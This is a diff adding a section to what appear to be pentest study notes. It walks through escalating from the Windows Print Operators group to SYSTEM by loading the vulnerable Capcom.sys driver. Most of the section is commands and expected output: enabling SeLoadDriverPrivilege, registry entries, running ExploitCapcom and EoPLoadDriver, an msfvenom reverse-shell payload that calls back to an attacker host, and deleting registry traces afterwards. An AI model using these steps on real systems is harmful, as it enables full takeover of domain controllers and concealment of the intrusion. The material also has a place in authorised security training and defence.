@@ -1693,3 +1693,224 @@ sc.exe start MozillaMaintenance
 This executes the malicious binary as **SYSTEM**, granting full privilege escalation.
 
 ---
+
+# 📝 Print Operators
+
+## 🔍 Overview
+
+* Members of the **Print Operators** group have high privileges on Domain Controllers.
+* Key capabilities include:
+
+  * Local logon to Domain Controllers
+  * Shutdown system
+  * Manage/create/delete printers
+  * **SeLoadDriverPrivilege** — ability to load kernel drivers
+* By default, SeLoadDriverPrivilege is present but **requires elevated/UAC-bypassed context** to be visible.
+
+This privilege allows loading **malicious or vulnerable drivers**, enabling **kernel-level privilege escalation to SYSTEM**.
+
+
+
+## 🔑 Privilege Enumeration
+
+### 1. Check privileges (non-elevated)
+
+```cmd
+whoami /priv
+```
+
+Typical result:
+
+* **SeLoadDriverPrivilege not shown**
+* Requires UAC bypass or elevated prompt to access it.
+
+
+### 2. After UAC bypass / Admin elevation
+
+```cmd
+whoami /priv
+```
+
+You will now see:
+
+```
+SeLoadDriverPrivilege (Disabled)
+```
+
+Even though disabled, it can be programmatically **enabled** and then abused.
+
+
+## 🚀 Exploitation via Capcom.sys (Kernel Vulnerable Driver)
+
+### 🔥 Why Capcom.sys?
+
+* Contains a vulnerable IOCTL that enables **arbitrary kernel code execution**.
+* Allows an unprivileged user (if allowed to load the driver) to escalate to SYSTEM.
+* Print Operators → SeLoadDriverPrivilege → driver loading → SYSTEM shell.
+
+
+
+## 🧪 Exploit Workflow
+
+### 1. Enable SeLoadDriverPrivilege Programmatically
+
+Use provided C++ PoC:
+
+### Edit the include headers:
+
+```c
+#include <windows.h>
+#include <assert.h>
+#include <winternl.h>
+#include <sddl.h>
+#include <stdio.h>
+#include "tchar.h"
+```
+
+### Compile using Visual Studio Developer Command Prompt
+
+```cmd
+cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
+```
+
+This creates:
+`EnableSeLoadDriverPrivilege.exe`
+
+
+### 2. Prepare Registry Entry for Malicious Driver
+
+Download **Capcom.sys** and place it at:
+
+```
+C:\Tools\Capcom.sys
+```
+
+Add registry references under **HKEY_CURRENT_USER** (HKCU):
+
+```cmd
+reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
+reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
+```
+
+Notes:
+
+* `\??\` is an NT Object Path.
+* Win32 resolves it correctly when loading kernel drivers.
+
+### 3. Verify Driver Not Loaded (Optional)
+
+Using DriverView:
+
+```powershell
+.\DriverView.exe /stext drivers.txt
+Select-String -Path drivers.txt -Pattern Capcom
+```
+
+
+### 4. Enable the Privilege & Load Driver
+
+```cmd
+EnableSeLoadDriverPrivilege.exe
+```
+
+Expected output:
+
+* SeLoadDriverPrivilege = **Enabled**
+* Registry driver entry recognized
+
+
+### 5. Verify Driver Loaded
+
+```powershell
+.\DriverView.exe /stext drivers.txt
+cat drivers.txt | Select-String Capcom
+```
+
+You should now see:
+
+```
+Driver Name: Capcom.sys
+Filename: C:\Tools\Capcom.sys
+```
+
+
+## 💥 Exploit the Driver to Get SYSTEM
+
+Compile ExploitCapcom and run:
+
+```powershell
+.\ExploitCapcom.exe
+```
+
+Expected output:
+
+```
+[+] Shellcode executed
+[+] Token stealing successful
+[+] SYSTEM shell launched
+```
+
+You now have an **NT AUTHORITY\SYSTEM** command shell.
+
+
+## 🛠️ Alternate Non-GUI Method
+
+If you don't have a GUI (no DriverView):
+
+Modify `ExploitCapcom.cpp`:
+
+### Original:
+
+```c
+TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
+```
+
+### Change to reverse shell payload:
+
+```c
+TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");
+```
+
+Generate payload with msfvenom:
+
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o revshell.exe
+```
+
+Run listener, execute ExploitCapcom.exe, and get SYSTEM back.
+
+
+## 🤖 Automating the Process: EoPLoadDriver
+
+```cmd
+EoPLoadDriver.exe System\CurrentControlSet\Capcom C:\Tools\Capcom.sys
+```
+
+This tool:
+
+* Enables SeLoadDriverPrivilege
+* Creates registry entries
+* Loads the driver automatically
+
+Then simply run:
+
+```cmd
+ExploitCapcom.exe
+```
+
+
+## 🧹 Clean-Up
+
+Remove registry traces:
+
+```cmd
+reg delete HKCU\System\CurrentControlSet\Capcom
+```
+
+Confirm deletion:
+
+```
+Yes
+```
+
+---
